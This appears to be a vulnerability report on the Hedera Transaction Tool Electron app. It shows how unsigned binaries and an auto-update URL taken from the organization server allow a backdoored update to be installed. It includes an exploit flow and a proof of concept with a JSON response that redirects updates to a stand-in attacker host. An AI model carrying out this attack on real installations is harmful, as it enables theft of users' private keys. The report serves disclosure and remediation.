### Title
Unsigned Electron Binaries and Organization-Server-Controlled Auto-Update URL Enable Malicious Binary Installation

### Summary
The Hedera Transaction Tool distributes Electron desktop binaries with code signing explicitly disabled (`notarize: false`) and no Windows certificate configured (marked "TBD"). Additionally, the auto-updater's feed URL is sourced directly from the connected organization server's version-check response, with no independent signature verification on downloaded binaries. A malicious or compromised organization server can direct the app to download and silently install a backdoored binary, compromising all Hedera private keys managed by the application.

### Finding Description

**Root Cause 1 — Unsigned distributed binaries:**

`front-end/electron-builder.yml` line 36 explicitly sets `notarize: false` for macOS builds: [1](#0-0) 

`front-end/RELEASE.md` line 3 shows Windows code signing is still unimplemented ("TBD"): [2](#0-1) 

This means binaries published to GitHub Releases carry no OS-verifiable signature. Users have no mechanism to confirm the binary was built by the legitimate development team.

**Root Cause 2 — Auto-updater feed URL sourced from organization server:**

The `updateUrl` used to initialize the auto-updater is derived from `organizationUpdateUrls`, which is populated from the connected organization server's version-check API response: [3](#0-2) 

This URL is passed via IPC directly to `ElectronUpdaterService.initialize()`: [4](#0-3) 

The updater is configured with `provider: 'generic'`, which fetches a `latest.yml` from the attacker-controlled URL and verifies only the SHA512 hash declared in that same `latest.yml`. Since the attacker controls both the binary and the `latest.yml`, this hash check provides no security guarantee: [5](#0-4) 

**Exploit flow:**
1. Attacker operates or compromises an organization server.
2. The server's version-check response returns a malicious `updateUrl` pointing to an attacker-controlled host.
3. The app stores this URL in `organizationUpdateUrls` and computes it as the global `updateUrl`.
4. When the app triggers an update check, `ElectronUpdaterService` sets the feed URL to the attacker's server.
5. The attacker's server serves a crafted `latest.yml` (with a version number higher than the current app) and a backdoored binary whose SHA512 matches the `latest.yml`.
6. `electron-updater` downloads and installs the backdoored binary.
7. On next launch, the malicious binary runs with full access to the local SQLite database containing encrypted Hedera private keys and mnemonics.

### Impact Explanation
The Electron app manages BIP-39 mnemonics and Hedera private keys in a local SQLite database encrypted with `argon2`. A backdoored binary has full filesystem access to this database and can exfiltrate keys or mnemonics, leading to complete compromise of all Hedera accounts managed by the tool. This is a direct theft of cryptographic assets. [6](#0-5) 

### Likelihood Explanation
The attacker only needs to operate a reachable organization server — this is an explicitly supported workflow (any user can add an organization server via the UI). No privileged access to the victim's machine or the legitimate GitHub account is required. The update flow is triggered automatically when the server reports a newer version, requiring no additional user interaction beyond the initial "Install Update" confirmation. The absence of code signing means the OS provides no warning that the binary is unsigned or from an unknown publisher. [7](#0-6) 

### Recommendation

**Short term:**
- Enable code signing for all platforms. For macOS, set `notarize: true` and configure `APPLE_ID`/`APPLE_TEAM_ID` secrets. For Windows, configure `WIN_CSC_LINK`/`WIN_CSC_KEY_PASSWORD`. Remove the "TBD" placeholder from `RELEASE.md` and enforce signing in CI.
- In `ElectronUpdaterService`, do not accept the feed URL from the organization server. Hard-code the update URL to the official GitHub Releases endpoint (already configured as `owner: hashgraph`, `repo: hedera-transaction-tool` in `electron-builder.yml`) and use the `github` provider instead of `generic`.

**Long term:**
- Publish GPG/Sigstore signatures alongside GitHub Release artifacts so users can independently verify binaries before installation.
- Treat the organization server as an untrusted peer for all security-sensitive decisions, including update distribution. [8](#0-7) 

### Proof of Concept

1. Stand up a server at `https://attacker.example.com` serving:
   - `GET /latest.yml` → a crafted YAML declaring version `99.0.0` and the SHA512 of a backdoored Electron binary.
   - `GET /hedera-transaction-tool-99.0.0-mac-universal.pkg` → the backdoored binary.
2. Stand up a minimal organization API server. Override the version-check endpoint (`GET /api/v1/users/check-version` or equivalent) to return:
   ```json
   { "updateUrl": "https://attacker.example.com", "latestVersion": "99.0.0", "versionStatus": "updateAvailable" }
   ```
3. In the Hedera Transaction Tool, add this organization server via Settings → Organizations → Add.
4. The app detects `versionStatus: updateAvailable`, sets the feed URL to `https://attacker.example.com`, downloads the backdoored binary, and prompts the user to install.
5. After installation and relaunch, the backdoored binary has full access to the local SQLite database containing Hedera private keys. [3](#0-2) [9](#0-8)

  initialize(updateUrl: string): void {
    if (!updateUrl) {
      this.logger.error('Cannot initialize updater: updateUrl is empty');
      return;
    }

    // Only re-initialize if the URL has changed
    if (this.currentUpdateUrl === updateUrl && this.updater) {
      this.logger.debug(`Updater already initialized with URL: ${updateUrl}`);
      return;
    }

    this.currentUpdateUrl = updateUrl;
    this.updater = autoUpdater;
    this.updater.setFeedURL({
      provider: 'generic',
      url: updateUrl,
    });

    this.logger.info(`Updater initialized with URL: ${updateUrl}`);
  }
